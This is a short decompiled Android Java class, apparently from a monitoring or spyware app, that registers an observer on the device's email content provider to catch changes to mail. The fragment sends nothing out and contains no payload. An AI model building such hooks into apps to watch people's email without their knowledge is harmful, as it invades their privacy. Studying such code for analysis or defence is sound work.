package com.network.android.monitor.observer;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import com.network.android.monitor.a.a;

public final class l extends r {

    /* renamed from: a  reason: collision with root package name */
    public static final String[] f97a = {"_id"};
    private static final String[] b = new String[0];
    private ContentObserver e;
    private String f = null;
    private long g;
    private boolean h;

    @Override // com.network.android.monitor.a.d
    public final void a(a aVar) {
        super.a(aVar);
        com.network.e.a.a aVar2 = (com.network.e.a.a) aVar;
        try {
            if (this.e == null) {
                Context a2 = aVar2.a();
                this.e = new m(this, aVar2);
                a2.getContentResolver().registerContentObserver(Uri.parse("content://com.android.email.provider//"), true, this.e);
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("get mail registerContentObserver - " + th.getMessage(), th);
        }
    }

    @Override // com.network.android.monitor.observer.r
    public final void a(com.network.e.a.a aVar) {
    }

    @Override // com.network.android.monitor.observer.r
    public final String[] a() {
        return b;
    }
}
